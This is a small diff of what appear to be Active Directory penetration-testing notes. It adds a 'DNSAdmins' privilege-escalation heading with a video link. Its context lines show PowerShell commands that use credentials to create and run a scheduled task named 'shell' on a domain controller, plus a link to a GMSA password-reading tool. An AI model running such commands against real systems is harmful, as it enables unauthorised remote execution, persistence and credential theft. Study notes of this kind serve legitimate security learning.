@@ -380,6 +380,10 @@ Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn
 Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
 ```
 
+### Priv Esc – DNSAdmins
+https://www.youtube.com/watch?v=LiIqn-l2Stg&list=PLziMzyAZFGMf8rGjtpV6gYbx5hozUNeSZ&index=84&ab_channel=I.T%26Security
+
+
 ### Group Managed Service Accounts (GMSA)
 https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
 https://stealthbits.com/blog/securing-gmsa-passwords/
